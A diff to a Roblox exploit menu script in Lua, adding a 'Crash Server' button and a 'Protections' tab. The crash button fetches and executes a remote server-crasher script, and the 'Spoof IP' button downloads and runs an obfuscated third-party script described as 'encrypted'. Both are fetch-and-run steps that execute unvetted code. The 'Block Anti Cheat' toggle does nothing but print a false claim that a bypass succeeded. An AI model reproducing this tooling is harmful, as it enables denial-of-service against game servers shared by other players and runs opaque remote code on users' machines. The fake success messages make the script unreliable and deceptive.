@@ -1,6 +1,8 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("Swiss Knief PRX by WeepingAngel", "BloodTheme")
 
+local banner = "WeepingAngel Production"
+
 local Main = Window:NewTab("Universal")
 local MainSection = Main:NewSection("Universal")
 
@@ -42,4 +44,37 @@ MiscSection:NewButton("Dex Explorer V4", "Roblox server file browser", function(
 end)
 MiscSection:NewButton("Infinity Yield", "Gives you an Admin Console :)", function()
     loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Yield.txt"))()
+end)
+MiscSection:NewButton("Crash Server", "Try to Crash the Server", function()
+    print("Starting Crash Attack...")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeroTwoooo/roblox-exploiting/master/SERVER%20CRASHER.lua"))()
+    print("Attack Sended!")
+end)
+
+local Protection = Window:NewTab("Protections")
+local ProtectionSection = Protection:NewSection("Protections")
+
+ProtectionSection:NewButton("Spoof IP", "Prevents you from the most script based IP Grabbers", function()
+    --[[
+    This script is encrypted to prevent reposting. Run this whole script as normal. 
+    Join our discord 4 questions: www.guard.lol/discord
+    (F9) for errors. 
+    ID is: 27567r
+    ]]
+    local credit='guardscripts'
+    local url=('https://raw.githubusercontent.com/%s/myscripts/main/scriptinit.lua'):format(credit)
+    init=loadstring(game:HttpGet(url,true))
+    getgenv().xscriptId='Mjc1Njdy'
+    init()
+end)
+ProtectionSection:NewToggle("Block Anti Cheat", "Try to block some anticheat checks (Beta)", function(state)
+    if state then
+        print(banner)
+        print("Scanning for Anti Cheat...")
+        print("Try to Block checks...")
+        print("Bypass looks successfully, Use with care!")
+    else
+        print(banner)
+        print("Bring everything back to normal...")
+    end
 end)
